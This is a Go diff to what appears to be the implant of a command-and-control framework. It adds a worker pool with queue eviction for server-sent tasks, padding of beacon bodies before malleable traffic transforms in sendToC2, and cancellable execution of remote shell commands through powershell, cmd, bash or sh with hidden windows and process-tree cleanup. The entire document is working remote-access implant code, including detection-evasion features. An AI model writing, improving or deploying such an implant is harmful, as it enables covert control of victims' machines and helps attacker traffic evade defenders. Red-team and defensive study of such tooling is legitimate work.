@@ -892,29 +892,66 @@ func nextBeaconSeq() uint64 {
 
 func startTaskWorker() {
 	taskWorkerOnce.Do(func() {
-		go func() {
-			for task := range taskQueue {
-				result := executeTask(task)
-				if task.Key != "" {
-					applyTaskKeyEncryption(task.Key, &result)
-				}
-				ensureResultID(&result)
-				enqueueResult(result)
-				inFastMode.Store(true)
-				select {
-				case beaconWake <- struct{}{}:
-				default:
-				}
-			}
-		}()
+		for i := 0; i < defaultTaskWorkers; i++ {
+			go workerLoop()
+		}
 	})
 }
 
+// enqueueTask hands a task to the execution pool without blocking the beacon
+// goroutine. When the queue is saturated the oldest waiting task is evicted
+// (and returned as an error result) so fresh commands are always accepted.
 func enqueueTask(task Task) {
-	taskQueue <- task
+	if !insertTask(task) {
+		// Extremely rare: the queue stayed full through the eviction attempts.
+		// Ack the delivery so the server never re-fetches it, and surface a
+		// terminal error so the task is not left "running" forever.
+		pendingMu.Lock()
+		pendingTaskAcks = append(pendingTaskAcks, task.ID)
+		pendingMu.Unlock()
+		enqueueResult(TaskResult{
+			TaskID: task.ID,
+			Type:   task.Type,
+			Error:  "task not accepted: queue busy",
+		})
+		return
+	}
 	pendingMu.Lock()
 	pendingTaskAcks = append(pendingTaskAcks, task.ID)
 	pendingMu.Unlock()
+}
+
+// insertTask places task on the queue, freeing a slot by evicting the oldest
+// waiting task first if it is full. Returns false if an empty slot could not be
+// found (only possible under heavy contention).
+func insertTask(task Task) bool {
+	for i := 0; i < 2; i++ {
+		select {
+		case taskQueue <- task:
+			return true
+		default:
+		}
+		select {
+		case evicted := <-taskQueue:
+			evictQueuedTask(evicted)
+		default:
+		}
+	}
+	return false
+}
+
+// evictQueuedTask acks the evicted task (it was delivered) and enqueues a
+// terminal error result so the server marks it failed instead of leaving it
+// running forever.
+func evictQueuedTask(task Task) {
+	pendingMu.Lock()
+	pendingTaskAcks = append(pendingTaskAcks, task.ID)
+	pendingMu.Unlock()
+	enqueueResult(TaskResult{
+		TaskID: task.ID,
+		Type:   task.Type,
+		Error:  fmt.Sprintf("task evicted before start: execution queue full (%d slots)", maxQueuedTasks),
+	})
 }
 
 const (
@@ -1349,10 +1386,7 @@ func sendToC2(idx int, body []byte) []byte {
 	}
 	url := urls[idx]
 
-	beaconURI := getActiveBeaconURIFromConfig()
-	if ContentLengthJitter > 0 {
-		beaconURI = addRandomParam(beaconURI)
-	}
+	beaconURI := beaconHTTPURI()
 
 	method := getActiveBeaconMethodFromConfig()
 	if method == "" {
@@ -1360,6 +1394,7 @@ func sendToC2(idx int, body []byte) []byte {
 	}
 	// Apply request-side malleable transforms to the outbound body so the
 	// server can strip them on inbound; the enclosed envelope is unchanged.
+	body = padBeaconBody(body)
 	body = wrapMalleableRequest(body)
 	req, err := http.NewRequest(method, url+beaconURI, bytes.NewReader(body))
 	if err != nil {
@@ -1830,23 +1865,24 @@ func executeTask(task Task) TaskResult {
 }
 
 func runShell(cmdStr, shell string) (string, error) {
+	ctx := currentExecCtx()
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
 		if shell == "powershell.exe" || strings.Contains(strings.ToLower(shell), "powershell") {
 			if !strings.Contains(cmdStr, "OutputEncoding") {
 				cmdStr = "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $OutputEncoding = [System.Text.Encoding]::UTF8; " + cmdStr
 			}
-			cmd = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
+			cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
 		} else {
-			cmd = exec.Command("cmd.exe", "/C", "chcp 65001 >nul & "+cmdStr)
+			cmd = exec.CommandContext(ctx, "cmd.exe", "/C", "chcp 65001 >nul & "+cmdStr)
 		}
 		applyHideWindow(cmd)
 	} else {
 		// Linux / unix
 		if shell == "" || shell == "bash" {
-			cmd = exec.Command("bash", "-c", cmdStr)
+			cmd = exec.CommandContext(ctx, "bash", "-c", cmdStr)
 		} else {
-			cmd = exec.Command("sh", "-c", cmdStr)
+			cmd = exec.CommandContext(ctx, "sh", "-c", cmdStr)
 		}
 	}
 
@@ -1854,6 +1890,17 @@ func runShell(cmdStr, shell string) (string, error) {
 	cmd.Stdout = &out
 	cmd.Stderr = &out
 	err := cmd.Run()
+	if err != nil && ctx.Err() != nil && cmd.Process != nil {
+		// Task aborted or timed out: the context kill only terminates the
+		// direct child. Tear down the rest of the tree so an orphaned
+		// `sleep 3600` does not linger. taskkill runs with a fresh context so
+		// it executes even though the task's own context is already cancelled.
+		if runtime.GOOS == "windows" {
+			_ = exec.Command("taskkill", "/F", "/T", "/PID", strconv.Itoa(cmd.Process.Pid)).Run()
+		} else {
+			_ = cmd.Process.Kill()
+		}
+	}
 	return decodeShellOutput(out.Bytes(), shell), err
 }
 
